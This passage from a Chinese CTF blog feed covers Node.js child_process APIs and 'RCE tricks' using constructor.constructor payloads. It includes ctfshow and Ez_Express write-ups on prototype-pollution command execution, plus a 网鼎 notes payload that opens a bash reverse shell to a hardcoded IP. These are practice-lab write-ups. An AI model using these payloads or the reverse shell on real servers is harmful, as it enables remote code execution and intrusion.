options])</code><ol><li>和<code>child_process.execSync()</code>更相似一点</li><li>区别<ol><li>execSync: 可以解析 shell 特性（如管道、重定向等），一次执行复杂命令</li><li>spawnSync:  直接执行指定的可执行文件，不通过 shell。因此，它不能解析 shell 特性，安全性更好 –&gt; <strong>指定shell字符时可以(chat一下就好)</strong></li></ol></li></ol></li></ol><h5 id="3-child-process-execFile-Sync-file-args-options-callback"><a href="#3-child-process-execFile-Sync-file-args-options-callback" class="headerlink" title="3. child_process.execFile[Sync](file[, args][, options][, callback])"></a>3. <code>child_process.execFile[Sync](file[, args][, options][, callback])</code></h5><ol><li><code>child_process.execFile[Sync](file[, args][, options][, callback])</code><ol><li>执行一个可执行文件，可以通过shell参数来执行命令<ol><li>默认不通过shell，这意味着你不能利用 shell 的功能，比如 I&#x2F;O 重定向和管道 –&gt; <code>execFile(&#39;/bin/ls&#39;, [&#39;-la&#39;])</code> 会直接调用 <code>/bin/ls</code> 并传递 <code>-la</code> 参数</li></ol></li><li><strong>要求</strong><ol><li><p>被执行的文件一定要有可执行权限，如果是类似.py类的特定语言的脚本，一定在开头指定解释器程序路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定 Python 解释器的路径和脚本路径</span></span><br><span class="line"><span class="keyword">const</span> pythonPath = <span class="string">&#x27;/usr/bin/python3&#x27;</span>; <span class="comment">// 或者你系统中 Python 的实际路径</span></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./script.py&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line"><span class="title function_">execFile</span>(pythonPath, [scriptPath, ...args], <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h5 id="4-child-process-fork-modulePath-args-options"><a href="#4-child-process-fork-modulePath-args-options" class="headerlink" title="4. child_process.fork(modulePath[, args][, options])"></a>4. <code>child_process.fork(modulePath[, args][, options])</code></h5><ol><li><code>fork()</code> 函数可用于创建一个新的 Node.js 进程，该进程与父进程共享相同的内存空间。这意味着<strong>父进程和子进程可以相互通信并访问彼此的变量和函数</strong><ol><li>与child_process.spawn()类似，返回一个ChildProcess对象。返回的ChildProcess将有一个额外的内置通信通道，允许消息在父进程和子进程之间来回传递 –&gt; 详见api文档</li><li>派生的Node.js子进程独立于父进程，但两者之间建立的IPC通信通道除外。每个进程都有自己的内存和V8实例。由于需要额外的资源分配，不建议生成大量的子Node.js进程</li></ol></li><li><strong>无法执行任意命令</strong>: child_process.fork()不支持child_process.spawn()中可用的shell选项，如果设置该选项，则将被忽略</li></ol><h5 id="补充的外部module"><a href="#补充的外部module" class="headerlink" title="补充的外部module"></a>补充的外部module</h5><ol><li>shelljs module from npm</li><li>simple-git</li></ol><h2 id="RCE-Tricks"><a href="#RCE-Tricks" class="headerlink" title="*RCE Tricks"></a>*RCE Tricks</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h3 id="原型链constructor构造载体"><a href="#原型链constructor构造载体" class="headerlink" title="原型链constructor构造载体"></a>原型链constructor构造载体</h3><h4 id="IIFE和Function"><a href="#IIFE和Function" class="headerlink" title="IIFE和Function"></a>IIFE和Function</h4><ol><li>在js中所有函数对象都是通过Function构造函数创建的 –&gt; 函数对象的<code>func.__proto__.constructor==Function</code>(通过原型链直接<code>func.constructor也是</code>)</li><li><strong>利用思路</strong>: 使用Function()来实现任意函数，并且通过抬手可得的原始类型(与包装对象有自动转换机制，<strong>自动装箱和拆箱</strong>)获取Function，这里以<code>Number</code>为例子<ol><li>Number.prototype 是所有 Number 实例的原型</li><li>Number 本身是一个函数，它的原型是 <code>Function.prototype</code></li><li>通过<code>(1).constructor.constructor</code>访问到<code>Function</code>对象</li></ol></li><li><em><strong><code>Function</code>对象</strong></em><ol><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">mdn Function</a></li><li><code>Function([arg1, arg2, ..., argN], functionBody)</code>可以构造<code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b;&#39;);</code></li></ol></li><li>*<strong>立即调用函数表达式IIFE</strong><ol><li><p>作用: 创建一个独立的作用域，以避免变量污染全局命名空间。IIFE 可以有效地封装变量和函数，使其对外部不可见</p></li><li><p>js两种调用形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="constructor-payload"><a href="#constructor-payload" class="headerlink" title="constructor payload"></a>constructor payload</h4><ol><li>CJS版本<ol><li><code>(1).constructor.constructor(&quot;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();&quot;)();</code></li><li><code>(1).constructor.constructor(&#39;return require(&quot;child_process&quot;).execSync(`\x64\x69\x72`).toString();&#39;)();</code> –&gt; 当exec中为十六进制时，要把单引号’改成反引号&#96;这里是js模板字符串</li></ol></li><li>ES6版本<ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97">mdn 动态加载模块</a></li><li><code>(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(cp=&gt;&#123;cp.exec(&#39;cat /flag&#39;);&#125;);&quot;)();</code></li></ol></li><li>实际操作可以写一个探测脚本，现在没必要</li></ol><h3 id="PP2RCE"><a href="#PP2RCE" class="headerlink" title="PP2RCE"></a>PP2RCE</h3><ol><li>详见recurrence: SycServer2_SCTF24</li></ol><h3 id="global-process-mainModule-constructor-load"><a href="#global-process-mainModule-constructor-load" class="headerlink" title="global.process.mainModule.constructor._load"></a>global.process.mainModule.constructor._load</h3><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>nodejs基础<ol><li><a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">菜鸟教程</a></li><li><a href="https://liaoxuefeng.com/books/javascript/nodejs/">廖雪峰</a></li><li>可以看看，感觉不错，其中具体模块可以看看api文档这些<a href="https://juejin.cn/post/7218117377053098039">系列专栏</a></li><li>其他核心概念：模块、事件驱动架构、异步 I&#x2F;O、流、缓冲区、全局对象、Node.js 运行时、节点包管理器 (npm)、事件循环、中间件和错误处理</li></ol></li><li>具体执行命令<ol><li>官方<a href="https://nodejs.org/api/child_process.html">api文档</a></li><li>看看学过人怎么讲<a href="https://segmentfault.com/a/1190000045261949#item-3-2">child_process</a></li><li><a href="https://blog.csdn.net/cindy647/article/details/108830841">外置模块</a></li><li>可以多查查绕过</li></ol></li><li>nodejs漏洞利用<ol><li><a href="https://hackerqwq.github.io/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/#eval%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">个人博客，很不错的一篇，点很多</a></li><li><a href="https://wiki.scuctf.com/ctfwiki/web/1.nodejs/nodejs/">川大ctf wiki</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_nodejs</title>
      <link href="/2024/10/30/ctfshow_nodejs/"/>
      <url>/2024/10/30/ctfshow_nodejs/</url>
      
        <content type="html"><![CDATA[<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ol><li><a href="https://blog.csdn.net/miuzzx/article/details/111780832">csdn挺好，比较全面</a></li><li><a href="https://blog.csdn.net/qq_53263789/article/details/121351854">csdn 还有其他资源</a></li><li><a href="https://hextuff.dev/2022/06/09/ctfshow-web-getting-started-nodejs/#web334">一个和我主题一样的个人博客</a></li></ol><h2 id="web334-看懂nodejs"><a href="#web334-看懂nodejs" class="headerlink" title="web334: 看懂nodejs"></a>web334: 看懂nodejs</h2><ol><li>直接审计代码，无需绕过，看懂即可秒了</li><li>payload: <code>username=ctfshow&amp;password=123456</code></li></ol><h2 id="web335-rce"><a href="#web335-rce" class="headerlink" title="web335: rce"></a>web335: rce</h2><ol><li>提示找不到文件，冥冥中感觉像是文件包含&#x2F;代码执行？注入1直接回显，执行命令有flag，payload<code>require(&quot;child_process&quot;).execSync(&#39;ls&#39;)</code></li><li>官方<code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</code></li></ol><h2 id="web-336"><a href="#web-336" class="headerlink" title="web 336:"></a>web 336:</h2><ol><li>过滤了exec，有exec就没有回显</li></ol><h2 id="web-337-数组黑魔法"><a href="#web-337-数组黑魔法" class="headerlink" title="web 337: 数组黑魔法"></a>web 337: 数组黑魔法</h2><ol><li>太明显我直接数组<code>?a[]=1&amp;b[]=1</code>过了</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ez_Express_CYCTF20</title>
      <link href="/2024/10/30/Ez_Express_CYCTF20/"/>
      <url>/2024/10/30/Ez_Express_CYCTF20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>抓包看源码，发现<a href="http://www.zip,阅读发现关键文件index.js/">www.zip，阅读发现关键文件index.js</a><ol><li>用户数据存储在req.session.user中</li><li>流程<ol><li>导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染</li><li>结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，<strong>覆盖</strong>？通过注册实现，但是有安全检查，等下再绕过，看看搞不搞得通<ol><li>思路1<ol><li>登录admin后传<strong>body污染原型链</strong>，原型链只能在登录后进行污染</li><li>获取信息，带外(需要命令执行)&#x2F;回显(难，没法读文件)，这里肯定要读文件，可不可以进行命令执行 -&gt; 通过原型链污染后新建的对象都会有某个属性，将某个属性设置为一个函数，<strong>执行命令</strong>，理论可行，可以执行命令直接看反弹shell，不出网就用回显处理(类似wangding24 web02)</li></ol></li><li>思路1待解决<ol><li>覆盖需要绕过，match()绕过，处理match还对username**进行了什么处理(从处理想对策)**，可能有用？toUpperCase()？<ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">toUpperCase</a>，可以进行绕过，这里node漏洞的</li></ol></li><li>命令执行部分使用shell.js可以一试，需要找到一个对象访问它的属性但是被覆盖 -&gt; 先访问&#x2F;action在访问&#x2F;info有res.outputFunctionName(在&#x2F;目录中的和&#x2F;action中的不一样)，通过<code>&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;: function() &#123;命令执行实现&#125;&#125;</code><ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><h2 id="修正"><a href="#修正" class="headerlink" title="*修正"></a>*修正</h2><ol><li>思路没有错就胜利很多了</li><li>fix1: 这里的<strong>访问属性调用函数有问题</strong><ol><li>payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code>这样来调用，插入模板进行调用，反而如果直接定义函数的的话无法被调用</li></ol></li><li>fix2: 注意传输json对象时要<strong>修改content-type: application&#x2F;json</strong></li></ol><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ol><li>注册<code>admın</code>成功进行覆盖</li><li>访问<code>/action</code>并进行覆盖，payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></li><li>访问<code>/info</code></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>几个核心思想<ol><li>读文件一般需要命令或者包含</li><li>进行了什么处理(从处理想对策)如uppercase</li><li>这种源码路由题还是先从路由再到细节想思路，不会太跳跃</li></ol></li><li>ref<ol><li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">p神的js toUpperCase绕过</a></li><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notes_网鼎20</title>
      <link href="/2024/10/30/notes_%E7%BD%91%E9%BC%8E20/"/>
      <url>/2024/10/30/notes_%E7%BD%91%E9%BC%8E20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>分析源码，目标肯定是&#x2F;status的地方<ol><li><code>let in</code>语句<strong>可以读取原型链的内容</strong>，构造payload<code>&quot;rce&quot;: &quot;ls&quot;</code> –&gt; <strong>需要考虑进行带外，因为是输出到标准输出</strong></li><li>可以考虑构造原型链到Object里，有两个目标<ol><li><p>一个是edit_note</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payloads，可以使用反弹shell实现，本地nc -lvnp 8080</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:<span class="string">&quot;__proto__.b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/8.218.92.67/8080 0&gt;&amp;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;h3110 w0r1d&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一个是write_note</p></li></ol></li></ol></li></ol><h2 id="直接源码"><a href="#直接源码" class="headerlink" title="直接源码"></a>直接源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">owner</span> = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span> = &#123;&#125;;    <span class="comment">// 定义了一个字典，在后面的攻击过程中会用到</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">write_note</span>(<span class="params">author, raw_note</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span>[(<span class="variable language_">this</span>.<span class="property">num</span>++).<span class="title function_">toString</span>()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_note</span>(<span class="params">id</span>) 